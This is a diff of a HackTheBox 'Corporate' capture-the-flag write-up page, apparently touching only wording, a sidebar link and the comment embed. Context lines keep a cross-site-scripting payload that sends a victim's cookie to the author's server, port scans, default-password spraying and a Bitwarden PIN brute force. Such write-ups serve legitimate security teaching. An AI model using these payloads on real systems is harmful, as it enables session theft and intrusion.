@@ -20,7 +20,7 @@
   <script type="text/javascript" async
     src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
     </script>
-  <link rel="stylesheet" href="/assets/css/style.css?v=2f614de94553f3c933b61f71c41cc4512ec056e3">
+  <link rel="stylesheet" href="/assets/css/style.css?v=ec6f8ab4b25e0e78b011995fe682b7c4e059c6de">
   <link rel="stylesheet" href="/assets/css/prism.css">
   <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
   <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
@@ -338,6 +338,21 @@
                 
                 
                 
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
                 
             </ul>
 
@@ -436,7 +451,7 @@
         
       </h2>
 
-<p>We start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
+<p>I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
 
 <pre><code class="language-bash">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.246
 # Nmap 7.94SVN scan initiated Thu Jun 27 22:10:15 2024 as: nmap -sSVC -p- --open --min-rate 5000 -v -n -Pn -oN corporateTCP 10.10.11.246
@@ -564,7 +579,7 @@ people                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 19
 :: Progress: [4989/4989] :: Job [1/1] :: 216 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
 </code></pre>
 
-<p>We have three new subdomains (we already had support). Add it to the /etc/hosts.</p>
+<p>We have three new subdomains (we already had support). I will add them to the /etc/hosts.</p>
     
       <h3 id="gitcorporatehtb">
         
@@ -724,7 +739,7 @@ logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 19
 
 <p><img src="/assets/images/Corporate/people.corporate.htb-login-redirects-to-sso.corporate.htb.png" alt="people.corporate.htb login redirects to sso.corporate.htb/login" /></p>
 
-<p>There are bunch of routes here, so it’s interesting. However, almost all redirect to /auth/login. Route / redirects to /dashboard that redirects to /auth/login and /static is for js and css files used in the web:</p>
+<p>There are bunch of routes here, so it’s interesting. However, almost all redirect to /auth/login. Route / redirects to /dashboard that redirects to /auth/login. Route /static is for js and css files used in the web:</p>
 
 <pre><code class="language-bash">❯ ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -v -u http://people.corporate.htb/FUZZ
 
@@ -817,7 +832,7 @@ ________________________________________________
 
 <p><img src="/assets/images/Corporate/html-injection-corporate.htb.png" alt="HTML injection in 404 page" /></p>
 
-<p>Since here there also are Content-Security-Policy directives, we neither can’t inject simple script tags and execute what we want, we have to use a script of the same page. A interesting one is /assets/js/analytics.min.js that is used with a ?v parameter in the source code of the main page and its value is reflected in the script:</p>
+<p>Since here there also are Content-Security-Policy directives implemented, we neither can’t inject simple script tags and execute what we want, we have to use a script of the same page. A interesting one is /assets/js/analytics.min.js that is used with a ?v parameter in the source code of the main page and its value is reflected in the script:</p>
 
 <p><img src="/assets/images/Corporate/corporate.htb-scripts.png" alt="corporate.htb scripts" />
 <img src="/assets/images/Corporate/v-parameter-reflected-on-analytics.min.js.png" alt="v parameter reflected in analytics.min.js script" /></p>
@@ -846,13 +861,13 @@ ________________________________________________
         
       </h4>
 
-<p>Since we have found a way to execute javascript code in a url and we have HTML injection in the chat, a nice way to send us the agent cookie is to insert a <code>&lt;meta&gt;</code> tag that redirects to the xss url and send to our http server the cookie:</p>
+<p>Since we have found a way to execute javascript code in a url and we have HTML injection in the chat, a nice way to send us the agent cookie (if flag HttpOnly is false) is to insert a <code>&lt;meta&gt;</code> tag that redirects to the xss url and send to our http server the cookie:</p>
 
 <blockquote>
   <p>payload: <code>&lt;meta http-equiv="refresh" content="0; url='http://corporate.htb/&lt;script src=%22/vendor/analytics.min.js%22&gt;&lt;/script&gt;&lt;script src=%22/assets/js/analytics.min.js?v=document.location=`http://10.10.14.133/?c=${document.cookie}`%22&gt;'"&gt;</code></p>
 </blockquote>
 
-<p>To make it realistic as it was a real attack, I will write to my own index.html to redirect to support.corporate.htb so the victim doesn’t see nothing strange since it redirects to my own server and the victim can see his cookie in the url. Also spawn the http server with python:</p>
+<p>To make it realistic as it was a real attack, I will write to my own index.html to redirect to support.corporate.htb so the victim doesn’t see nothing strange. I will do this since it redirects to my own server and the victim can see his cookie in the url. Remember to start the http server with python:</p>
 
 <pre><code class="language-bash">❯ mkdir web-server
 ❯ cd web-server
@@ -881,7 +896,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <p><img src="/assets/images/Corporate/profile.png" alt="profile" /></p>
 
-<p>In the chat, we have links for other users which url is <code>/employee/&lt;ID&gt;</code>, where I can see the same info as in my profile but for other users:</p>
+<p>In the chat, we have links for other users whose url is <code>/employee/&lt;ID&gt;</code>, where I can see the same info as in my profile but for other users:</p>
 
 <p><img src="/assets/images/Corporate/chat-corporate.png" alt="chat corporate" />
 <img src="/assets/images/Corporate/user-url-corporate.png" alt="user url corporate" /></p>
@@ -1023,13 +1038,13 @@ Sysadmin
 
 <p><img src="/assets/images/Corporate/ovpn-connect.png" alt="vpn on port 1194 udp" /></p>
 
-<p>Downloading it and connecting, I can see that is adds the route 10.9.0.0/24 via 10.8.0.1:</p>
+<p>Downloading it and connecting, I can see that it adds the route 10.9.0.0/24 via 10.8.0.1:</p>
 
 <pre><code class="language-bash">❯ sudo openvpn hermina-leuschke.ovpn
 </code></pre>
 <p><img src="/assets/images/Corporate/added-routes-vpn.png" alt="added routes for IPs vpn" /></p>
 
-<p>I will map the network with this simple bash oneliner that goes through a loop from 1 to 255 (range of IPs valid here) and test for this hosts using ping and if the command exited successfully (that’s why using the &amp;&amp; operand), it will echo that the host is active. It’s possible to see that 10.9.0.1 is active (which is the route IP) and 10.9.0.4:</p>
+<p>I will map the network with this simple bash oneliner that goes through a loop from 1 to 255 (range of IPs valid here) and test for this hosts using ping, and if the command exited successfully (that’s why using the &amp;&amp; operand), it will echo that the host is active. It’s possible to see that 10.9.0.1 is active (which is the route IP) and 10.9.0.4:</p>
 
 <pre><code class="language-bash">❯ for i in $(seq 1 255);do timeout 1 bash -c "ping -c 1 10.9.0.$i" &amp;&gt;/dev/null &amp;&amp; echo "Host 10.9.0.$i is active";done;wait
 Host 10.9.0.1 is active
@@ -1254,13 +1269,13 @@ Nmap done: 2 IP addresses (2 hosts up) scanned in 154.36 seconds
            Raw packets sent: 153447 (6.752MB) | Rcvd: 147823 (5.913MB)
 </code></pre>
 
-<p>In port 3004, its running gitea and in port 3128 a Proxmox virtual environment API, so that’s why probably there are 2 hosts, 10.9.0.1 probably is for host machine and 10.9.0.4 a proxmox virtual machine. However, there is nothing interesting now.</p>
+<p>There is a SSH port in both hosts that we didn’t have access before. In port 3004, its running gitea and in port 3128 a Proxmox virtual environment API, so that’s why probably there are 2 hosts: 10.9.0.1 probably is for host machine and 10.9.0.4 a proxmox virtual machine. There is also a NFS port in 10.9.0.1 but as rpcbind is in the other host, we can’t use it. So there is nothing interesting now.</p>
 
 <p>A thing to notice is that files are downloaded using an id, but it’s not vulnerable to IDOR:</p>
 
 <p><img src="/assets/images/Corporate/file-download-not-idor.png" alt="file download not vulnerable to IDOR" /></p>
 
-<p>However, there is a share functionality that I can use to share with myself some files, and looking at the request is also using an ID:</p>
+<p>However, there is a share functionality that I can use to share files with somebody, and looking at the request is also using an ID:</p>
 
 <blockquote>
   <p>Note: I will take the email from my profile as saw before</p>
@@ -1274,7 +1289,7 @@ Nmap done: 2 IP addresses (2 hosts up) scanned in 154.36 seconds
 
 <p>However, I can use the XSS of above to have access as another user in another private window (ctrl+mayus+p in firefox) and share with him.</p>
 
-<p>Now I also have access as Candido Hackett (in your case can also be different) and I can share with me a file (I will upload first one named share-this-file.txt to differentiate):</p>
+<p>Now I also have access as Candido Hackett (in your case can also be different) and I can share with him a file (I will first upload one named share-this-file.txt to differentiate):</p>
 
 <p><img src="/assets/images/Corporate/shared-normal-file.png" alt="Shared file" /></p>
 
@@ -1323,7 +1338,7 @@ ________________________________________________
 
 <p><img src="/assets/images/Corporate/default-password-instructions.png" alt="password and vpn instructions" /></p>
 
-<p>The password for each user is CorporateStarterDDMMYYYY where DDMMYYYY is his birthday and we are able to see that birthday in each user url as we saw before. I will modify the script of above to instead of printing each role and user, taking its birthday, test for the corresponding password in the login and if success, print the user with the password:</p>
+<p>The default password for each user is CorporateStarterDDMMYYYY where DDMMYYYY is his birthday and we are able to see that birthday in each user url as we saw before. What if some users forgot to change his password? I will modify the script of above to instead of printing each role and user, take its birthday, test for the corresponding password in the login and if it success, print the user with the password:</p>
 
 <pre><code class="language-python">#!/usr/bin/python3
 import requests, pdb, re
@@ -1600,7 +1615,7 @@ Nmap done: 2 IP addresses (2 hosts up) scanned in 154.36 seconds
            Raw packets sent: 153447 (6.752MB) | Rcvd: 147823 (5.913MB)
 </code></pre>
 
-<p>We don’t have nothing new but we can connect to ssh with those users (we also can with the first vpn we had) in 10.9.0.4:</p>
+<p>We don’t have nothing new but we can connect to ssh with those users (we also could be able with the first vpn we had) in 10.9.0.4:</p>
 
 <pre><code class="language-bash">❯ cat hosts
 ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
@@ -1870,7 +1885,7 @@ A009040300010104F1FF0106500800FFFF050000800400FFFF7468656D65000000060D1014737973
 sqlite&gt; 
 </code></pre>
 
-<p>There is a bunch of data. In <a href="https://www.reddit.com/r/firefox/comments/b5mome/how_can_i_read_the_sqlite_files_of_firefox_addons/">this reddit post</a>, I can see it uses snappy, so I will do the same and successfully decrypt the data:</p>
+<p>There is a bunch of data. In <a href="https://www.reddit.com/r/firefox/comments/b5mome/how_can_i_read_the_sqlite_files_of_firefox_addons/">this reddit post</a>, I can see that the databases of firefox addons use snappy, so I will do the same and successfully decrypt the data:</p>
 
 <pre><code class="language-bash">❯ sqlite3 -line 3647222921wleabcEoxlt-eengsairo.sqlite 'select hex(data) from object_data' | awk '{print $2}' FS=' = ' &gt; data.hex
 </code></pre>
@@ -3525,7 +3540,7 @@ Testing 4 digit pins from 0000 to 9999
 Pin not found
 </code></pre>
 
-<p>This is because the kdfIterations for the encryption. In the script is using 100.000, but the default are 600.000 as seen in <a href="https://github.com/bitwarden/clients/blob/main/libs/common/src/auth/models/domain/kdf-config.ts">this lines of code</a> in the bitwarden password manager:</p>
+<p>This is because the kdfIterations for the encryption. The default are 600.000 as seen in <a href="https://github.com/bitwarden/clients/blob/main/libs/common/src/auth/models/domain/kdf-config.ts">this lines of code</a> in the bitwarden password manager but the script is using 100.000:</p>
 
 <pre><code class="language-rust">let password_hash = Pbkdf2
                 .hash_password_customized(
@@ -4177,24 +4192,6 @@ root@corporate:~# cat root.txt
 
   <div id="comments" class="container">
     <section id="disqus_container">
-      
-      <hr>
-      <div id="disqus_thread"></div>
-<script>
-    function disqus_config() {
-        this.callbacks.onReady.push(function() {
-            setSizes();
-        });
-    }
-    (function () {
-        var d = document, s = d.createElement('script');
-        s.src = 'https://captainirs-github-io.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by
-        Disqus.</a></noscript>
       
     </section>
   </div>
